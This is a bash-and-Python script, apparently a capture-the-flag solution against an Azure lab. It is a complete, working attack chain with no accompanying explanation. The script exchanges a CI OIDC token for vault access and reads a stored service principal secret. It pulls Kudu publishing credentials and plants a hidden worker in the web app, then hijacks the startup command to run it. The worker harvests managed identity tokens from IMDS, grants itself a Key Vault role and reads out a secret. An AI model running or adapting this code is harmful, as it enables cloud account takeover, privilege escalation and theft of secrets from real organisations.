#!/usr/bin/env bash
set +e
python3 - <<'PY'
import base64, json, os, time, urllib.parse, urllib.request, urllib.error

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
CID = "72ff278a-9e71-43ec-bac4-2ca303f8e462"
RG_R = "rg-tbl-reporting-prod-eus"
APP = "app-tbl-reporting-prod"
KV_PROD = "https://kv-tbl-prod-x3euoz.vault.azure.net"

def rq(u, m="GET", d=None, h=None, t=35):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, data=d, method=m, headers=h or {}), timeout=t)
        return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()

def fpost(u, o):
    s, b = rq(u, "POST", urllib.parse.urlencode(o).encode(),
              {"Content-Type": "application/x-www-form-urlencoded"})
    return s, json.loads(b.decode())

# 1-4: OIDC → FIC vault → SP read → ARM
req = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange"
s, b = rq(req, "GET", None, {"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
oidc = json.loads(b.decode())["value"]
print("OIDC_LEN", len(oidc), flush=True)

s, d = fpost(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token", {
    "client_id": CID, "grant_type": "client_credentials",
    "scope": "https://vault.azure.net/.default",
    "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
    "client_assertion": oidc,
})
vt = d["access_token"]; print("VAULT_TOK", len(vt), flush=True)

s, b = rq(KV_PROD + "/secrets/reporting-service-principal?api-version=7.4",
          "GET", None, {"Authorization": "Bearer " + vt})
sp = json.loads(json.loads(b.decode())["value"])
spcid = sp.get("appId") or sp.get("clientId")
spsec = sp.get("clientSecret") or sp.get("password")
print("SP_APPID", spcid, flush=True)

s, d = fpost(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token", {
    "client_id": spcid, "grant_type": "client_credentials",
    "client_secret": spsec, "scope": "https://management.azure.com/.default",
})
arm = d["access_token"]; print("ARM_TOK", len(arm), flush=True)

# 5: Kudu publishing creds
s, b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG_R}/providers/Microsoft.Web/sites/{APP}/config/publishingcredentials/list?api-version=2023-01-01",
          "POST", b"{}", {"Authorization": "Bearer " + arm, "Content-Type": "application/json"})
pub = json.loads(b.decode())["properties"]
ku = pub["publishingUserName"]; kp = pub["publishingPassword"]
auth = base64.b64encode((ku + ":" + kp).encode()).decode()
print("KUDU_USER_OK", bool(ku), "KUDU_PASS_LEN", len(kp), flush=True)

# 6: worker that runs INSIDE main worker container (IDENTITY_ENDPOINT will exist there)
worker_py = r'''
import base64, json, os, sys, time, urllib.parse, urllib.request, urllib.error, uuid
OUT = "/home/site/wwwroot/.flag.out"
def log(*a):
    s = " ".join(str(x) for x in a)
    print(s, flush=True)
    try:
        with open(OUT, "a") as f: f.write(s + "\n")
    except Exception: pass
IE = os.environ.get("IDENTITY_ENDPOINT", "")
IH = os.environ.get("IDENTITY_HEADER", "")
log("IDENTITY_ENDPOINT=", repr(IE), "HAS_HDR=", bool(IH))
MIRES = "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
MICID = "7a85156a-01c4-4e61-8472-40a92107159b"
def rq(u, h={}, m="GET", d=None, t=25):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, headers=h, data=d, method=m), timeout=t)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode(errors="replace")
    except Exception as e: return 0, repr(e)
def mitok(res):
    if IE:
        for sel in ["mi_res_id=" + urllib.parse.quote(MIRES), "client_id=" + MICID, ""]:
            q = IE + "?resource=" + urllib.parse.quote(res, safe="") + "&api-version=2019-08-01"
            if sel: q += "&" + sel
            s, b = rq(q, {"X-IDENTITY-HEADER": IH})
            if s == 200:
                try: return json.loads(b)["access_token"]
                except Exception: pass
            log("MI_IE_FAIL", res, sel, s, b[:200])
    for apiv in ["2018-02-01","2019-08-01"]:
        for sel in ["mi_res_id=" + urllib.parse.quote(MIRES), "client_id=" + MICID]:
            q = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=" + apiv + "&resource=" + urllib.parse.quote(res, safe="") + "&" + sel
            s, b = rq(q, {"Metadata":"true"})
            if s == 200:
                try: return json.loads(b)["access_token"]
                except Exception: pass
            log("MI_IMDS_FAIL", apiv, sel, s, b[:200])
    return ""
vt = mitok("https://vault.azure.net")
at = mitok("https://management.azure.com")
log("MI_VT_LEN", len(vt), "MI_AT_LEN", len(at))
if not vt or not at:
    log("GIVE_UP_NO_MI");
else:
    seg = vt.split(".")[1]; seg += "=" * (-len(seg) % 4)
    oidv = json.loads(base64.urlsafe_b64decode(seg))["oid"]
    log("MI_OID", oidv)
    scope = "subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
    url = "https://management.azure.com/" + scope + "/providers/Microsoft.Authorization/roleAssignments/" + str(uuid.uuid4()) + "?api-version=2022-04-01"
    body = json.dumps({"properties":{"roleDefinitionId":"/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":oidv,"principalType":"ServicePrincipal"}}).encode()
    s, b = rq(url, {"Authorization":"Bearer "+at, "Content-Type":"application/json"}, "PUT", body, 30)
    log("ROLE_ASSIGN", s, b[:500])
    for i in range(50):
        s, b = rq("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4",
                  {"Authorization":"Bearer " + mitok("https://vault.azure.net")})
        log("FLAG_TRY", i+1, "status", s, "body", b[:600])
        if s == 200:
            try: log("FLAG_VALUE=" + json.loads(b)["value"])
            except Exception: pass
            break
        time.sleep(5)
# keep container alive-ish for app svc port probe grace
try: time.sleep(30)
except: pass
'''

# 7: push worker to persistent wwwroot
print("=== VFS PUT worker ===", flush=True)
s, b = rq(f"https://{APP}.scm.azurewebsites.net/api/vfs/site/wwwroot/.flag.py",
          "PUT", worker_py.encode(),
          {"Authorization": "Basic " + auth, "If-Match": "*", "Content-Type": "application/octet-stream"}, 60)
print("VFS_PUT", s, b.decode(errors="replace")[:200], flush=True)

# clear old flag.out
rq(f"https://{APP}.scm.azurewebsites.net/api/vfs/site/wwwroot/.flag.out",
   "DELETE", None, {"Authorization": "Basic " + auth, "If-Match": "*"}, 30)

# 8: snapshot current config
print("=== GET current web config ===", flush=True)
s, b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG_R}/providers/Microsoft.Web/sites/{APP}/config/web?api-version=2022-03-01",
          "GET", None, {"Authorization": "Bearer " + arm})
cfg = json.loads(b.decode())
old_cmd = cfg.get("properties", {}).get("appCommandLine", "")
print("OLD_APPCMDLINE=", repr(old_cmd), flush=True)

# 9: PATCH appCommandLine
new_cmd = "bash -c 'python3 /home/site/wwwroot/.flag.py >> /home/site/wwwroot/.flag.out 2>&1; tail -f /dev/null'"
print("=== PATCH appCommandLine ===", flush=True)
s, b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG_R}/providers/Microsoft.Web/sites/{APP}/config/web?api-version=2022-03-01",
          "PATCH", json.dumps({"properties": {"appCommandLine": new_cmd}}).encode(),
          {"Authorization": "Bearer " + arm, "Content-Type": "application/json"}, 60)
print("PATCH_CFG", s, b.decode(errors="replace")[:300], flush=True)

# 10: restart
print("=== POST restart ===", flush=True)
s, b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG_R}/providers/Microsoft.Web/sites/{APP}/restart?api-version=2022-03-01",
          "POST", b"", {"Authorization": "Bearer " + arm}, 60)
print("RESTART", s, b.decode(errors="replace")[:200], flush=True)

# 11: poll for /home/site/wwwroot/.flag.out via Kudu VFS
print("=== polling for .flag.out ===", flush=True)
flag_content = ""
for i in range(60):
    time.sleep(5)
    s, b = rq(f"https://{APP}.scm.azurewebsites.net/api/vfs/site/wwwroot/.flag.out",
              "GET", None, {"Authorization": "Basic " + auth}, 30)
    if s == 200:
        flag_content = b.decode(errors="replace")
        if "FLAG_VALUE=" in flag_content or "DF26" in flag_content or "GIVE_UP_NO_MI" in flag_content:
            print("POLL", i*5, "s -> complete, size", len(flag_content), flush=True)
            break
        print("POLL", i*5, "s -> partial, size", len(flag_content), flush=True)
    else:
        print("POLL", i*5, "s -> status", s, flush=True)

print("--- FLAG_OUT_BEGIN ---")
print(flag_content)
print("--- FLAG_OUT_END ---")

# 12: restore old appCommandLine (best effort)
print("=== restore appCommandLine ===", flush=True)
s, b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG_R}/providers/Microsoft.Web/sites/{APP}/config/web?api-version=2022-03-01",
          "PATCH", json.dumps({"properties": {"appCommandLine": old_cmd}}).encode(),
          {"Authorization": "Bearer " + arm, "Content-Type": "application/json"}, 60)
print("RESTORE", s, flush=True)
PY
